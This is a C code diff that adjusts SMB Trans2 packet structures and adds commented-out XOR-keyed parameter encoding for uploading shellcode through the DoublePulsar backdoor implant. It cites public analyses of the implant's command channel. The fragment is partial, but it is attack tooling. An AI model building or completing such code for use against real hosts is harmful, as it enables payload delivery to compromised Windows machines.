@@ -24,6 +24,11 @@ The FreeRTOS+TCP implementation cannot use any C compiler specific syntax in the
 and instead allows users to define their own packing directives in two very simple header files that are then included from the C files.
 */
 
+/* Sources used:
+https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
+https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html
+*/
+
 #pragma pack(1)
 //struct __attribute__((__packed__)) net_bios
 typedef struct
@@ -75,7 +80,8 @@ typedef struct
 	unsigned char reserved3;
 	ushort subcommand;
 	ushort byteCount;
-	ushort padding;
+	//ushort padding;  //creates 2 bytes, while the packet only needs 1
+	unsigned char padding; //creates 1 byte.  do NOT use ushort for this padding
 } Trans_Response;
 
 //Size of params:  12 
@@ -85,6 +91,12 @@ typedef struct
 	ULONG chunksize;
 	ULONG offset;
 } smb_parameters;
+
+/*typedef struct __attribute__((__packed__)) 
+{
+	unsigned char parameters[12];
+} smb_parameters;
+*/
 
 typedef struct
 {
@@ -207,7 +219,26 @@ void generate_SMB_packet()
 	trans2->subcommand = 0x000e;
 	trans2->byteCount = 4109; //make this dynamic -> calc based off sizeof(params)+sizeof(SMB_DATA)
 	trans2->padding = 0x00;
-
+	
+	/*
+	smb_parameters *smb_params = (smb_parameters*)(buffer + sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response));
+	
+	//make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
+	//In this case, this is static but will change to be dynamic in the future.
+    	unsigned long DataSize = 0x507308 ^ XorKey;
+	
+	//size of the chunk of the payload being sent.  all but last packet are 4096
+    	unsigned long chunksize = 4096 ^ XorKey;
+	
+	//offset begins at 0 and increments based on the previous packets sent
+    	unsigned long offset = 0 ^ XorKey;
+    
+    	memcpy(smb_params->parameters, (unsigned char*)&DataSize, 4);
+    	memcpy(smb_params->parameters + 4, (unsigned char*)&chunksize, 4);
+    	memcpy(smb_params->parameters +8 , (unsigned char*)&offset, 4);
+	
+	*/
+	
 	hexDump(0, send_buffer, 4178);
 
 	getchar();
